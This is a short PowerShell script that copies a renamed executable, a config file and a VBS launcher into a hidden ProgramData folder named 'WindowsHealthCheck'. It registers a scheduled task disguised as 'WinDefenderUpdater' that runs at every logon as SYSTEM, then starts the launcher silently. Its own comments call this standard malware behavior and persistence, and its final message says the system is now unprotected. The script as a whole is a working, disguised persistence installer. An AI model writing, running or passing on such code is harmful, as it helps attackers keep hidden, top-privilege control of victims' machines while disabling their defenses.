# 1. Create a hidden folder in ProgramData (standard malware behavior)
$path = "C:\ProgramData\WindowsHealthCheck"
if (!(Test-Path $path)) { New-Item -ItemType Directory -Path $path -Force }

# 2. Copy the tool and your invisible launcher there
Copy-Item "win_svc_opt.exe" "$path\win_svc_opt.exe"
Copy-Item "Config.toml" "$path\Config.toml"
Copy-Item "launch.vbs" "$path\launch.vbs"

# 3. Create the Scheduled Task so it starts on every reboot/login
# This is the "Persistence" - it runs as SYSTEM (highest power)
$action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "$path\launch.vbs"
$trigger = New-ScheduledTaskTrigger -AtLogOn
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName "WinDefenderUpdater" -Action $action -Trigger $trigger -Principal $principal -Force

# 4. Trigger the first run right now (silently)
Start-Process "wscript.exe" -ArgumentList "$path\launch.vbs" -WindowStyle Hidden

Write-Host "Boom. System is now unprotected and will stay that way after reboot." -ForegroundColor Cyan